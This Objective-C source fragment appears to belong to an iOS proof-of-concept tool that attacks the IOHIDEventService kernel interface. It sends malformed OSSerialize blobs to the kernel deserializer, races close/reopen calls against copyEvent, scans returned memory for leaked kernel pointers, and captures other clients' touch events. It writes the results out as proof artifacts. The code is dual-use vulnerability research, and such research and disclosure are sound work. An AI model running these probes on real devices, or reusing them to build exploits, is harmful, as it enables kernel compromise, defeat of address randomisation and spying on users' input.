        NSString *next = [self.logView.text stringByAppendingFormat:@"%@\n", line];
        self.logView.text = next;
        [self.logView scrollRangeToVisible:NSMakeRange(next.length, 0)];
    } else {
        dispatch_async(dispatch_get_main_queue(), ^{
            NSString *next = [self.logView.text stringByAppendingFormat:@"%@\n", line];
            self.logView.text = next;
            [self.logView scrollRangeToVisible:NSMakeRange(next.length, 0)];
        });
    }
}

- (void)clearLifecyclePocState {
    self.proofCrossClientEvents = 0;
    self.proofCrossClientChecks = 0;
    self.proofTerminationProbes = 0;
    self.proofTerminationOpenCycles = 0;
    self.proofCrossClientSignal = NO;
    self.proofTermRaceActive = NO;
    self.proofHashChanged = NO;
    self.proofKernelPointerPatterns = NO;
    self.proofKernelPointerLeak = NO;
    self.proofKernelPointerValue = 0;
    self.proofKernelPointerOffset = -1;
    self.proofKernelPointerSourceConn = -1;
    self.proofKernelPointerHex = nil;
    self.proofPrimaryScanCount = 0;
    self.proofPrimaryLeakCount = 0;
    self.proofZoneFreePatternHits = 0;
    self.proofUninitLeaks = 0;
    self.proofReadAfterCloseLeaks = 0;
    self.proofRemapAfterFreeLeaks = 0;
    self.proofEntropyDelta = 0.0;
    self.proofFirstCrossClientConn = -1;
    self.proofFirstCrossClientEventSize = 0;
    self.proofFirstCrossClientHex = nil;
    self.proofArtifactPath = nil;
}

- (BOOL)isLikelyKernelPointerValue:(uint64_t)value {
    if (value == 0) return NO;
    uint32_t hi32 = (uint32_t)(value >> 32);
    // Check for common kernel address patterns:
    // 0xFFFFFE00_______: kernel text/data on arm64
    // 0xFFFFFE0________: alternative kernel range
    // 0xFFFFFF80_______: kernel stack/heap
    // 0xFFFFFF00_______: additional kernel range
    return hi32 == 0xFFFFFE00 ||
           (value >> 36) == 0xFFFFFE0 ||
           hi32 == 0xFFFFFF80 ||
           hi32 == 0xFFFFFF00 ||
           (value >= 0xFFFFFE0000000000ULL && value <= 0xFFFFFFFFFFFFFFFFULL);
}

// Aggressive kernel pointer scan across entire buffer with multiple alignments
- (NSArray<NSDictionary *> *)scanForKernelPointers:(const uint8_t *)base
                                           length:(size_t)length
                                     maxResults:(int)maxResults
                                     connIndex:(int)connIndex {
    NSMutableArray<NSDictionary *> *results = [NSMutableArray array];
    if (!base || length < 8) return results;

    // Scan at multiple alignments to catch unaligned pointers
    for (size_t align = 0; align < 8; align++) {
        for (size_t off = align; off + 8 <= length; off += 4) {  // 4-byte stride for thorough coverage
            uint64_t val = 0;
            memcpy(&val, base + off, sizeof(val));

            if ([self isLikelyKernelPointerValue:val]) {
                // Check if this might be part of a vtable or function pointer array
                BOOL inPointerArray = NO;
                if (off >= 8 && off + 16 <= length) {
                    uint64_t prev = 0, next = 0;
                    memcpy(&prev, base + off - 8, sizeof(prev));
                    memcpy(&next, base + off + 8, sizeof(next));
                    inPointerArray = [self isLikelyKernelPointerValue:prev] ||
                                    [self isLikelyKernelPointerValue:next];
                }

                NSDictionary *leak = @{
                    @"offset": @(off),
                    @"value": [NSString stringWithFormat:@"0x%016llx", val],
                    @"alignment": @(align),
                    @"connIndex": @(connIndex),
                    @"inArray": @(inPointerArray),
                    @"context": [self hexPreview:(base + (off >= 16 ? off - 16 : 0))
                                         length:MIN(48, length - (off >= 16 ? off - 16 : 0))]
                };
                [results addObject:leak];

                if (results.count >= maxResults) {
                    return results;
                }
            }
        }
    }

    return results;
}

- (void)appendPocArtifactEntry:(NSDictionary *)entry {
    if (!entry) {
        return;
    }

    NSString *artifactsDir = [NSTemporaryDirectory() stringByAppendingPathComponent:@"TestPOCProofs"];
    [[NSFileManager defaultManager] createDirectoryAtPath:artifactsDir
                               withIntermediateDirectories:YES
                                                attributes:nil
                                                     error:nil];

    struct timeval tv;
    gettimeofday(&tv, NULL);
    NSString *timestamp = [NSString stringWithFormat:@"%ld_%06ld", tv.tv_sec, (long)tv.tv_usec];
    uint32_t randSuffix = (uint32_t)arc4random();
    NSString *filePath = [artifactsDir stringByAppendingPathComponent:
                         [NSString stringWithFormat:@"lifecycle_poc_%@_%08x.json", timestamp, randSuffix]];

    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:entry
                                                       options:NSJSONWritingPrettyPrinted
                                                         error:nil];
    if (jsonData && [jsonData writeToFile:filePath atomically:YES]) {
        self.proofArtifactPath = filePath;
        [self appendLog:[NSString stringWithFormat:@"Proof artifact written: %@", filePath]];
    } else {
        [self appendLog:@"Proof artifact write failed."];
    }
}

// ========== DEEP BOUNDARY PROBES ==========

#pragma mark - Binary Blob Builder

/// Build a binary-format OSSerialize blob from an array of 32-bit words + optional trailing data.
/// Prepends the magic header with 0xD4 as the first byte.
- (NSData *)buildBinaryBlob:(const uint32_t *)words count:(uint32_t)wordCount
               trailingData:(const uint8_t *)trailing trailingLen:(size_t)trailingLen {
    // Magic: 0x000000D4 (little-endian: D4 00 00 00)
    uint32_t magic = 0x000000D4;
    NSMutableData *blob = [NSMutableData dataWithCapacity:(1 + wordCount) * 4 + trailingLen];
    [blob appendBytes:&magic length:4];
    if (words && wordCount > 0) {
        [blob appendBytes:words length:wordCount * sizeof(uint32_t)];
    }
    if (trailing && trailingLen > 0) {
        [blob appendBytes:trailing length:trailingLen];
    }
    return blob;
}

/// Open a fresh connection to an IOHIDEventService instance (type=2).
- (kern_return_t)openFreshConnection:(io_connect_t *)outConn {
    *outConn = MACH_PORT_NULL;
    if (!sIOServiceGetMatchingServices || !sIOIteratorNext) return KERN_NOT_SUPPORTED;

    CFMutableDictionaryRef matching = sIOServiceMatching("IOHIDEventService");
    if (!matching) return KERN_INVALID_ARGUMENT;

    io_iterator_t iter = MACH_PORT_NULL;
    kern_return_t kr = sIOServiceGetMatchingServices(MACH_PORT_NULL, matching, &iter);
    if (kr != KERN_SUCCESS || iter == MACH_PORT_NULL) return kr;

    io_service_t service = MACH_PORT_NULL;
    while ((service = sIOIteratorNext(iter)) != MACH_PORT_NULL) {
        io_connect_t conn = MACH_PORT_NULL;
        kr = sIOServiceOpen(service, mach_task_self_, 2, &conn);
        sIOObjectRelease(service);
        if (kr == KERN_SUCCESS && conn != MACH_PORT_NULL) {
            *outConn = conn;
            sIOObjectRelease(iter);
            return KERN_SUCCESS;
        }
    }
    sIOObjectRelease(iter);
    return KERN_NOT_FOUND;
}

/// Open multiple gated connections to the SAME IOHIDEventService provider.
/// Each IOServiceOpen creates a separate UserClient with its own IOCommandGate,
/// allowing concurrent entry from separate userclients (unless the provider itself
/// serializes internally via its own workloop/locks).
/// Returns the number of connections successfully opened and gated.
- (int)openMultipleGatedConnections:(io_connect_t *)outConns
                           maxCount:(int)maxCount
                         outService:(io_service_t *)outService {
    if (!sIOServiceGetMatchingServices || !sIOIteratorNext || maxCount <= 0) return 0;

    for (int i = 0; i < maxCount; i++) outConns[i] = MACH_PORT_NULL;
    if (outService) *outService = MACH_PORT_NULL;

    CFMutableDictionaryRef matching = sIOServiceMatching("IOHIDEventService");
    if (!matching) return 0;

    io_iterator_t iter = MACH_PORT_NULL;
    kern_return_t kr = sIOServiceGetMatchingServices(MACH_PORT_NULL, matching, &iter);
    if (kr != KERN_SUCCESS || iter == MACH_PORT_NULL) return 0;

    int opened = 0;
    io_service_t service = MACH_PORT_NULL;

    while ((service = sIOIteratorNext(iter)) != MACH_PORT_NULL) {
        // Try to open and gate a first connection to this service
        io_connect_t firstConn = MACH_PORT_NULL;
        kr = sIOServiceOpen(service, mach_task_self_, 2, &firstConn);
        if (kr != KERN_SUCCESS || firstConn == MACH_PORT_NULL) {
            sIOObjectRelease(service);
            continue;
        }

        // Gate it with selector 0 (open)
        uint64_t scalarIn = 0;
        const char *xml = kOpenPropertiesXML;
        kern_return_t gateKr = sIOConnectCallMethod(
            firstConn, kSelectorOpen,
            &scalarIn, 1,
            xml, strlen(xml) + 1,
            NULL, NULL, NULL, NULL);
        if (gateKr != KERN_SUCCESS) {
            sIOServiceClose(firstConn);
            sIOObjectRelease(service);
            continue;
        }

        outConns[0] = firstConn;
        opened = 1;
        [self appendLog:[NSString stringWithFormat:@"Multi-conn: connection 0 opened+gated (0x%x)", firstConn]];

        // Now open remaining connections to the SAME service
        for (int i = 1; i < maxCount; i++) {
            io_connect_t conn = MACH_PORT_NULL;
            kr = sIOServiceOpen(service, mach_task_self_, 2, &conn);
            if (kr != KERN_SUCCESS || conn == MACH_PORT_NULL) {
                [self appendLog:[NSString stringWithFormat:@"Multi-conn: connection %d open failed 0x%x", i, kr]];
                continue;
            }

            // Gate this connection too
            gateKr = sIOConnectCallMethod(
                conn, kSelectorOpen,
                &scalarIn, 1,
                xml, strlen(xml) + 1,
                NULL, NULL, NULL, NULL);
            if (gateKr != KERN_SUCCESS) {
                [self appendLog:[NSString stringWithFormat:@"Multi-conn: connection %d gate failed 0x%x", i, gateKr]];
                sIOServiceClose(conn);
                continue;
            }

            outConns[opened] = conn;
            opened++;
            if (opened <= 5 || i == maxCount - 1) {
                [self appendLog:[NSString stringWithFormat:@"Multi-conn: connection %d opened+gated (0x%x)", i, conn]];
            } else if (opened == 6) {
                [self appendLog:@"Multi-conn: (suppressing per-connection logs for remaining...)"];
            }
        }

        // Keep the service alive if the caller wants to use it later (e.g. for IOServiceOpen
        // in the termination-race thread). Otherwise release it as usual.
        if (outService) {
            *outService = service;
        } else {
            sIOObjectRelease(service);
        }
        break; // Found a working service, done
    }

    sIOObjectRelease(iter);
    [self appendLog:[NSString stringWithFormat:@"Multi-conn: %d/%d connections established to same provider", opened, maxCount]];
    return opened;
}

#pragma mark - Phase 1: Input Validation Probe (Binary Deserializer)

- (void)runBinaryFormatProbe:(io_connect_t)referenceConn {
    [self appendLog:@"\n====== Phase 1: Input Validation Probe (Binary Deserializer) ======"];

    // OSSerialize binary format constants
    static const uint32_t kOSSerializeEndCollection = 0x80000000;
    static const uint32_t kOSSerializeDictionary    = 0x01000000;
    static const uint32_t kOSSerializeArray          = 0x02000000;
    static const uint32_t kOSSerializeNumber         = 0x04000000;
    static const uint32_t kOSSerializeSymbol         = 0x08000000;
    static const uint32_t kOSSerializeString         = 0x09000000;
    static const uint32_t kOSSerializeData           = 0x0A000000;
    static const uint32_t kOSSerializeBoolean        = 0x0B000000;
    static const uint32_t kOSSerializeBackref        = 0x0C000000;
    (void)kOSSerializeArray; (void)kOSSerializeNumber;
    (void)kOSSerializeString; (void)kOSSerializeData;
    (void)kOSSerializeBackref;

    // Helper: padded symbol data (4-byte aligned, null terminated)
    // "FastPathHasEntitlement" = 22 chars + 1 null = 23, pad to 24
    const char sym1[] = "FastPathHasEntitlement\0\0"; // 24 bytes
    // "FastPathMotionEventEntitlement" = 30 chars + 1 null = 31, pad to 32
    const char sym2[] = "FastPathMotionEventEntitlement\0\0"; // 32 bytes

    // ---- Test 1: Valid binary dict (baseline) ----
    {
        // dict(2) + sym1(len=23) + bool(true) + sym2(len=30)|end + bool(true)|end
        uint32_t words[] = {
            kOSSerializeDictionary | 2,
            kOSSerializeSymbol | 23,
        };
        NSMutableData *blob = [[self buildBinaryBlob:words count:2 trailingData:NULL trailingLen:0] mutableCopy];
        [blob appendBytes:sym1 length:24]; // padded symbol
        uint32_t boolTrue = kOSSerializeBoolean | 1; // value=1 (true)
        [blob appendBytes:&boolTrue length:4];
        uint32_t sym2Header = kOSSerializeSymbol | 31; // len=31
        [blob appendBytes:&sym2Header length:4];
        [blob appendBytes:sym2 length:32]; // padded symbol
        uint32_t boolTrueEnd = kOSSerializeBoolean | kOSSerializeEndCollection | 1;
        [blob appendBytes:&boolTrueEnd length:4];
        [self runBinaryProbeTest:@"1: Valid binary dict" blob:blob connection:referenceConn];
    }

    // ---- Test 2: Empty binary dict (count=0) ----
    {
        uint32_t words[] = {
            kOSSerializeDictionary | kOSSerializeEndCollection | 0,
        };
        NSData *blob = [self buildBinaryBlob:words count:1 trailingData:NULL trailingLen:0];
        [self runBinaryProbeTest:@"2: Empty binary dict (count=0)" blob:blob connection:referenceConn];
    }

    // ---- Test 3: Dict with count=0xFFFFFF (large-value handling) ----
    {
        uint32_t words[] = {
            kOSSerializeDictionary | kOSSerializeEndCollection | 0x00FFFFFF,
        };
        NSData *blob = [self buildBinaryBlob:words count:1 trailingData:NULL trailingLen:0];
        [self runBinaryProbeTest:@"3: Dict count=0xFFFFFF (large-value)" blob:blob connection:referenceConn];
    }

    // ---- Test 4: Backref to index 0xFFFFFF (bounds validation) ----
    {
        uint32_t words[] = {
            kOSSerializeDictionary | 1,
            kOSSerializeSymbol | 4,
        };
        NSMutableData *blob = [[self buildBinaryBlob:words count:2 trailingData:NULL trailingLen:0] mutableCopy];
        const char key[] = "key\0"; // 4 bytes, already aligned
        [blob appendBytes:key length:4];
        uint32_t backref = kOSSerializeBackref | kOSSerializeEndCollection | 0x00FFFFFF;
        [blob appendBytes:&backref length:4];
        [self runBinaryProbeTest:@"4: Backref index=0xFFFFFF (bounds check)" blob:blob connection:referenceConn];
    }

    // ---- Test 5: Backref to index 0 (circular reference handling) ----
    {
        uint32_t words[] = {
            kOSSerializeDictionary | 1,
            kOSSerializeSymbol | 4,
        };
        NSMutableData *blob = [[self buildBinaryBlob:words count:2 trailingData:NULL trailingLen:0] mutableCopy];
        const char key[] = "key\0";
        [blob appendBytes:key length:4];
        uint32_t backref = kOSSerializeBackref | kOSSerializeEndCollection | 0;
        [blob appendBytes:&backref length:4];
        [self runBinaryProbeTest:@"5: Backref index=0 (self-ref)" blob:blob connection:referenceConn];
    }

    // ---- Test 6: Deeply nested dicts (recursion depth check) ----
    {
        NSMutableData *blob = [[self buildBinaryBlob:NULL count:0 trailingData:NULL trailingLen:0] mutableCopy];
        const char nestKey[] = "k\0\0\0"; // len=2, padded to 4
        for (int i = 0; i < 64; i++) {
            uint32_t dictHeader = kOSSerializeDictionary | 1;
            [blob appendBytes:&dictHeader length:4];
            uint32_t symHeader = kOSSerializeSymbol | 2;
            [blob appendBytes:&symHeader length:4];
            [blob appendBytes:nestKey length:4];
        }
        // Innermost value: bool true with end collection
        uint32_t boolEnd = kOSSerializeBoolean | kOSSerializeEndCollection | 1;
        [blob appendBytes:&boolEnd length:4];
        [self runBinaryProbeTest:@"6: 64 nested dicts (recursion depth)" blob:blob connection:referenceConn];
    }

    // ---- Test 7: String with length=0 ----
    {
        uint32_t words[] = {
            kOSSerializeDictionary | 1,
            kOSSerializeSymbol | 4,
        };
        NSMutableData *blob = [[self buildBinaryBlob:words count:2 trailingData:NULL trailingLen:0] mutableCopy];
        const char key[] = "key\0";
        [blob appendBytes:key length:4];
        uint32_t strHeader = kOSSerializeString | kOSSerializeEndCollection | 0;
        [blob appendBytes:&strHeader length:4];
        [self runBinaryProbeTest:@"7: String length=0" blob:blob connection:referenceConn];
    }

    // ---- Test 8: String with length=0xFFFFFF (oversized) ----
    {
        uint32_t words[] = {
            kOSSerializeDictionary | 1,
            kOSSerializeSymbol | 4,
        };
        NSMutableData *blob = [[self buildBinaryBlob:words count:2 trailingData:NULL trailingLen:0] mutableCopy];
        const char key[] = "key\0";
        [blob appendBytes:key length:4];
        uint32_t strHeader = kOSSerializeString | kOSSerializeEndCollection | 0x00FFFFFF;
        [blob appendBytes:&strHeader length:4];
        [self runBinaryProbeTest:@"8: String length=0xFFFFFF (oversize)" blob:blob connection:referenceConn];
    }

    // ---- Test 9: Number with wrong size (not 1/2/4/8) ----
    {
        uint32_t words[] = {
            kOSSerializeDictionary | 1,
            kOSSerializeSymbol | 4,
        };
        NSMutableData *blob = [[self buildBinaryBlob:words count:2 trailingData:NULL trailingLen:0] mutableCopy];
        const char key[] = "key\0";
        [blob appendBytes:key length:4];
        // Number with size=3 (invalid — should be 1, 2, 4, or 8 bytes)
        uint32_t numHeader = kOSSerializeNumber | kOSSerializeEndCollection | 3;
        [blob appendBytes:&numHeader length:4];
        uint32_t numData = 0x41414141;
        [blob appendBytes:&numData length:4]; // provide some data
        [self runBinaryProbeTest:@"9: Number size=3 (size validation)" blob:blob connection:referenceConn];
    }

    // ---- Test 10: Data blob with size exceeding remaining buffer ----
    {
        uint32_t words[] = {
            kOSSerializeDictionary | 1,
            kOSSerializeSymbol | 4,
        };
        NSMutableData *blob = [[self buildBinaryBlob:words count:2 trailingData:NULL trailingLen:0] mutableCopy];
        const char key[] = "key\0";
        [blob appendBytes:key length:4];
        // Data with size=256 but we only provide 4 bytes after this
        uint32_t dataHeader = kOSSerializeData | kOSSerializeEndCollection | 256;
        [blob appendBytes:&dataHeader length:4];
        uint32_t smallData = 0xDEADBEEF;
        [blob appendBytes:&smallData length:4];
        [self runBinaryProbeTest:@"10: Data size>buffer (bounds check)" blob:blob connection:referenceConn];
    }

    // ---- Test 11: Truncated mid-entry (only magic + 1 word) ----
    {
        uint32_t words[] = {
            kOSSerializeDictionary | 1,
        };
        NSData *blob = [self buildBinaryBlob:words count:1 trailingData:NULL trailingLen:0];
        [self runBinaryProbeTest:@"11: Truncated mid-entry" blob:blob connection:referenceConn];
    }

    // ---- Test 12: Valid dict but wrong key names ----
    {
        uint32_t words[] = {
            kOSSerializeDictionary | 2,
            kOSSerializeSymbol | 10,
        };
        NSMutableData *blob = [[self buildBinaryBlob:words count:2 trailingData:NULL trailingLen:0] mutableCopy];
        const char wrongKey1[] = "WrongKey1\0\0\0"; // 10 + pad to 12
        [blob appendBytes:wrongKey1 length:12];
        uint32_t boolTrue = kOSSerializeBoolean | 1;
        [blob appendBytes:&boolTrue length:4];
        uint32_t sym2Header = kOSSerializeSymbol | 10;
        [blob appendBytes:&sym2Header length:4];
        const char wrongKey2[] = "WrongKey2\0\0\0"; // 10 + pad to 12
        [blob appendBytes:wrongKey2 length:12];
        uint32_t boolTrueEnd = kOSSerializeBoolean | kOSSerializeEndCollection | 1;
        [blob appendBytes:&boolTrueEnd length:4];
        [self runBinaryProbeTest:@"12: Wrong key names (semantic)" blob:blob connection:referenceConn];
    }

    // ---- Test 13: Invalid type tag 0x7F ----
    {
        uint32_t words[] = {
            0x7F000000 | kOSSerializeEndCollection | 1,
        };
        NSData *blob = [self buildBinaryBlob:words count:1 trailingData:NULL trailingLen:0];
        [self runBinaryProbeTest:@"13: Type tag 0x7F (invalid)" blob:blob connection:referenceConn];
    }

    // ---- Test 14: Binary magic + XML content ----
    {
        // Magic header (0xD4) followed by XML text
        const char xmlAfterMagic[] = "<dict><key>FastPathHasEntitlement</key><true/></dict>";
        NSData *blob = [self buildBinaryBlob:NULL count:0
                                trailingData:(const uint8_t *)xmlAfterMagic
                                 trailingLen:strlen(xmlAfterMagic)];
        [self runBinaryProbeTest:@"14: Binary magic + XML (confusion)" blob:blob connection:referenceConn];
    }

    [self appendLog:@"====== Phase 1 Complete ======"];
}

/// Run a single binary probe test on an existing connection:
/// force a not-open state, send blob via selector 0, log, then close on success.
- (void)runBinaryProbeTest:(NSString *)name
                      blob:(NSData *)blob
                connection:(io_connect_t)connection {
    if (connection == MACH_PORT_NULL) {
        [self appendLog:[NSString stringWithFormat:@"[%@] SKIP: no active connection", name]];
        return;
    }

    // Ensure selector 0 probes run from a not-open state on the same instance.
    uint64_t closeScalar = 0;
    kern_return_t preCloseKr = sIOConnectCallMethod(
        connection, kSelectorClose,
        &closeScalar, 1, NULL, 0,
        NULL, NULL, NULL, NULL
    );
    if (preCloseKr != KERN_SUCCESS
        && preCloseKr != (kern_return_t)0xE00002BE /* kIOReturnNotOpen */
        && preCloseKr != (kern_return_t)0xE00002CD /* kIOReturnNotReady */)
    {
        [self appendLog:[NSString stringWithFormat:
                         @"[%@] pre-close: 0x%x (%s)",
                         name, preCloseKr, mach_error_string(preCloseKr)]];
    }

    uint64_t scalarIn = 0;
    kern_return_t kr = sIOConnectCallMethod(
        connection, kSelectorOpen,
        &scalarIn, 1,
        blob.bytes, blob.length,
        NULL, NULL, NULL, NULL
    );

    if (kr == (kern_return_t)0xE00002C5) { // kIOReturnExclusiveAccess / device already open
        [self appendLog:[NSString stringWithFormat:
                         @"[%@] kr=0x%x (%s) blobSize=%zu [PRECONDITION: busy/open, not parser outcome]",
                         name, kr, mach_error_string(kr), (size_t)blob.length]];
    } else {
        [self appendLog:[NSString stringWithFormat:@"[%@] kr=0x%x (%s) blobSize=%zu",
                         name, kr, mach_error_string(kr), (size_t)blob.length]];
    }

    // Log first 32 bytes of blob for reference
    size_t previewLen = MIN((size_t)32, (size_t)blob.length);
    [self appendLog:[NSString stringWithFormat:@"  blob: %@",
                     [self hexPreview:(const uint8_t *)blob.bytes length:previewLen]]];

    // Close and release
    if (kr == KERN_SUCCESS) {
        uint64_t closeScalar2 = 0;
        sIOConnectCallMethod(connection, kSelectorClose, &closeScalar2, 1, NULL, 0, NULL, NULL, NULL, NULL);
    }
}

#pragma mark - Phase 2: Concurrency Stress Test (Close/CopyEvent Synchronization)

/// Returns YES if workers drained cleanly, NO if timed out (connection may be in inconsistent state).
- (BOOL)runConcurrencyStressTest:(io_connect_t)connection {
    [self appendLog:@"\n====== Phase 2: Close/CopyEvent Synchronization Test ======"];

    static const int kStressCycles = 100;
    __block atomic_int readerRunning = 1;
    __block atomic_int unexpectedErrors = 0;
    __block atomic_int stateConfusions = 0;
    __block _Atomic kern_return_t lastReaderKr = KERN_SUCCESS;

    dispatch_queue_t readerQueue = dispatch_queue_create("com.testpoc.sync.reader", DISPATCH_QUEUE_SERIAL);
    dispatch_queue_t closerQueue = dispatch_queue_create("com.testpoc.sync.closer", DISPATCH_QUEUE_SERIAL);
    dispatch_group_t group = dispatch_group_create();

    // Reader thread: rapidly call copyEvent
    dispatch_group_enter(group);
    dispatch_async(readerQueue, ^{
        uint32_t readCount = 0;
        uint32_t errorTransitions = 0;
        kern_return_t prevKr = KERN_SUCCESS;

        while (atomic_load(&readerRunning) == 1 || readCount < 100) {
            if (atomic_load(&readerRunning) == 0 && readCount >= 100) break;

            uint64_t scalarsIn[2] = { 0, 1 };
            uint8_t structOut[256];
            size_t structOutSize = sizeof(structOut);

            kern_return_t kr = sIOConnectCallMethod(
                connection, kSelectorCopyEvent,
                scalarsIn, 2, NULL, 0,
                NULL, NULL, structOut, &structOutSize
            );

            if (kr != prevKr) {
                errorTransitions++;
                // Check for state confusion signals
                if (kr != KERN_SUCCESS
                    && kr != (kern_return_t)0xE00002CD   // kIOReturnNotReady
                    && kr != (kern_return_t)0xE00002BC   // kIOReturnBadArgument
                    && kr != (kern_return_t)0xE00002BE)  // kIOReturnNotOpen
                {
                    atomic_fetch_add(&unexpectedErrors, 1);
                    [self appendLog:[NSString stringWithFormat:
                        @"  SYNC NOTE: unexpected copyEvent error 0x%x (%s) after %u reads",
                        kr, mach_error_string(kr), readCount]];
                }
                if (kr == (kern_return_t)0xE00002C2) { // kIOReturnExclusiveAccess
                    atomic_fetch_add(&stateConfusions, 1);
                    [self appendLog:@"  SYNC NOTE: kIOReturnExclusiveAccess — unexpected state transition."];
                }
                prevKr = kr;
            }
            atomic_store(&lastReaderKr, kr);
            readCount++;
        }

        [self appendLog:[NSString stringWithFormat:
            @"  Reader done: %u reads, %u error transitions, last kr=0x%x",
            readCount, errorTransitions, atomic_load(&lastReaderKr)]];
        dispatch_group_leave(group);
    });

    // Closer thread: close/reopen cycles
    dispatch_group_enter(group);
    dispatch_async(closerQueue, ^{
        for (int cycle = 0; cycle < kStressCycles; cycle++) {
            // Close
            uint64_t closeScalar = 0;
            kern_return_t closeKr = sIOConnectCallMethod(
                connection, kSelectorClose,
                &closeScalar, 1, NULL, 0,
                NULL, NULL, NULL, NULL
            );

            // Immediately re-open with valid keys
            uint64_t openScalar = 0;
            const char *xml = kOpenPropertiesXML;
            kern_return_t openKr = sIOConnectCallMethod(
                connection, kSelectorOpen,
                &openScalar, 1,
                xml, strlen(xml) + 1,
                NULL, NULL, NULL, NULL
            );

            if (cycle % 25 == 0) {
                [self appendLog:[NSString stringWithFormat:
                    @"  Cycle %d/%d: close=0x%x reopen=0x%x",
                    cycle, kStressCycles, closeKr, openKr]];
            }
        }

        // Signal reader to stop
        atomic_store(&readerRunning, 0);
        [self appendLog:@"  Closer done, signaled reader to stop."];
        dispatch_group_leave(group);
    });

    // Wait for both threads (with timeout)
    BOOL workersDrained = YES;
    dispatch_time_t timeout = dispatch_time(DISPATCH_TIME_NOW, 30 * NSEC_PER_SEC);
    long result = dispatch_group_wait(group, timeout);
    if (result != 0) {
        // Signal reader to stop, then give workers a grace period to drain
        atomic_store(&readerRunning, 0);
        [self appendLog:@"  WARNING: Concurrency test timed out after 30s, draining workers..."];
        dispatch_time_t drainTimeout = dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC);
        long drainResult = dispatch_group_wait(group, drainTimeout);
        if (drainResult != 0) {
            [self appendLog:@"  WARNING: Workers did not drain within 5s grace period."];
            workersDrained = NO;
        }
    }

    [self appendLog:[NSString stringWithFormat:
        @"Concurrency results: unexpectedErrors=%d stateTransitions=%d",
        unexpectedErrors, stateConfusions]];

    if (unexpectedErrors > 0 || stateConfusions > 0) {
        [self appendLog:@"  NOTE: Concurrent operations produced anomalous error codes — synchronization gap noted."];
    } else {
        [self appendLog:@"  No concurrency anomalies detected in this run."];
    }

    [self appendLog:@"====== Phase 2 Complete ======"];
    return workersDrained;
}

#pragma mark - Phase 3: Event Visibility Probe

- (BOOL)isZeroFilled:(const uint8_t *)bytes length:(size_t)length {
    if (!bytes) return NO;
    for (size_t i = 0; i < length; i++) {
        if (bytes[i] != 0) return NO;
    }
    return YES;
}

// Collection payload layouts vary by provider/device.
// Instead of fixed header offsets, scan for a fully-consistent child chain.
- (BOOL)findCollectionChildChainStart:(const uint8_t *)base
                            totalSize:(size_t)totalSize
                             outStart:(size_t *)outStart
                        outChildCount:(int *)outChildCount
                          outCoverage:(size_t *)outCoverage {
    if (outStart) *outStart = 0;
    if (outChildCount) *outChildCount = 0;
    if (outCoverage) *outCoverage = 0;
    if (!base || totalSize < 32) return NO;

    const int kMaxChildren = 64;
    size_t bestStart = 0;
    size_t bestCoverage = 0;
    int bestCount = 0;

    for (size_t cand = 16; cand + 16 <= totalSize; cand += 4) {
        size_t off = cand;
        int count = 0;
        BOOL valid = YES;

        while (off + 16 <= totalSize && count < kMaxChildren) {
            uint32_t childSize = 0;
            memcpy(&childSize, base + off, sizeof(childSize));

            if (childSize < 16
                || (size_t)childSize > (totalSize - off)
                || (childSize & 0x3) != 0) {
                valid = NO;
                break;
            }

            // Keep scanner conservative: low-byte type should be in expected range.
            uint32_t typeField = 0;
            memcpy(&typeField, base + off + 12, sizeof(typeField));
            uint32_t childType = typeField & 0xFF;
            if (childType > 0x7F) {
                valid = NO;
                break;
            }

            count++;
            off += childSize;

            if (off == totalSize) break;

            // Allow tiny trailing zero padding after a complete chain.
            if ((totalSize - off) < 16) {
                if ([self isZeroFilled:base + off length:(totalSize - off)]) {
                    off = totalSize;
                } else {
                    valid = NO;
                }
                break;
            }
        }

        if (count >= kMaxChildren && off < totalSize) {
            valid = NO;
        }
        if (!valid || count == 0 || off <= cand) {
            continue;
        }

        size_t coverage = off - cand;
        if (count > bestCount || (count == bestCount && coverage > bestCoverage)) {
            bestCount = count;
            bestStart = cand;
            bestCoverage = coverage;
        }
    }

    if (bestCount == 0) return NO;
    if (outStart) *outStart = bestStart;
    if (outChildCount) *outChildCount = bestCount;
    if (outCoverage) *outCoverage = bestCoverage;
    return YES;
}

// Heuristic decoder for the SPU Collection frame observed on AppleSPUHIDDriver:
// size=0x5a, header fields fixed, payload tail carries changing signed fields.
- (BOOL)parseSPUCollectionFrame:(const uint8_t *)eventBytes
                      eventSize:(size_t)eventSize
                     outSummary:(NSString **)outSummary {
    if (outSummary) *outSummary = nil;
    if (!eventBytes || eventSize < 0x5A) return NO;

    uint32_t d28 = 0, d32 = 0, d36 = 0, d48 = 0, d56 = 0, d60 = 0;
    memcpy(&d28, eventBytes + 28, 4);
    memcpy(&d32, eventBytes + 32, 4);
    memcpy(&d36, eventBytes + 36, 4);
    memcpy(&d48, eventBytes + 48, 4);
    memcpy(&d56, eventBytes + 56, 4);
    memcpy(&d60, eventBytes + 60, 4);

    // Signature taken from repeated on-device frames in output.txt
    if (!(d28 == 1 && d32 == 0x3E && d36 == 1 && d56 == 0x22 && d60 == 0xD3)) {
        return NO;
    }

    uint64_t q64 = 0;
    uint32_t seq = 0;
    int32_t v1 = 0, v2 = 0, v3 = 0;
    memcpy(&q64, eventBytes + 64, 8);
    memcpy(&seq, eventBytes + 72, 4);
    memcpy(&v1, eventBytes + 76, 4);
    memcpy(&v2, eventBytes + 80, 4);
    memcpy(&v3, eventBytes + 84, 4);

    int16_t v3lo = (int16_t)(v3 & 0xFFFF);
    int16_t v3hi = (int16_t)((uint32_t)v3 >> 16);
    NSString *summary = [NSString stringWithFormat:
                         @"SPU frame(sig=0x%x/0x%x flags=0x%x) seq=%u vec=(%d,%d,%d) v3_parts=(%d,%d) q64=0x%llx",
                         d56, d60, d48, seq, v1, v2, v3, v3lo, v3hi, (unsigned long long)q64];
    if (outSummary) *outSummary = summary;
    return YES;
}

- (void)runEventCapture:(io_connect_t)connection
             mappedAddr:(mach_vm_address_t)mappedAddr
             mappedSize:(mach_vm_size_t)mappedSize {
    [self appendLog:@"\n====== Phase 3: Event Visibility Probe ======"];
    [self appendLog:@"Touch the screen or type to generate events..."];
    [self appendLog:@"Capturing for ~10 seconds (200 polls at 50ms)..."];

    static const int kCapturePollCount = 200;
    static const useconds_t kPollIntervalUs = 50000; // 50ms
    static const int kProofMarkerSplitPoll = kCapturePollCount / 2;

    int eventCount = 0;
    // Full-event dedup: normalize timestamp (+4..+11) before comparing.
    uint8_t prevStable[kMappedProbeMaxBytes];
    memset(prevStable, 0, sizeof(prevStable));
    size_t prevStableLen = 0;
    BOOL havePrev = NO;

    // Correlation counters for child event types.
    int childDigitizerCount = 0; // type 11 — touch events
